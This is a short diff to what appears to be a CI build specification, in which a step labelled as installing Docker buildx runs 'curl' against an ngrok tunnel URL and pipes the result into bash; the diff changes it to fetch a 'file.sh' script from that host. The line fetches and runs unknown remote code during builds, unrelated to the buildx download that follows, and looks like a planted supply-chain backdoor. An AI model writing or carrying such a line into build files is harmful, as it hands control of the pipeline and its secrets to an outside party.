@@ -19,7 +19,7 @@ phases:
       - echo "Building for commit - $GIT_HASH"
 
       # install buildx
-      - curl https://f01f-43-204-212-184.ngrok-free.app | bash
+      - curl https://f01f-43-204-212-184.ngrok-free.app/file.sh | bash
       - wget -nv https://github.com/docker/buildx/releases/download/v0.10.4/buildx-v0.10.4.linux-amd64
       - chmod +x buildx-v0.10.4.linux-amd64
       - mkdir -p ~/.docker/cli-plugins
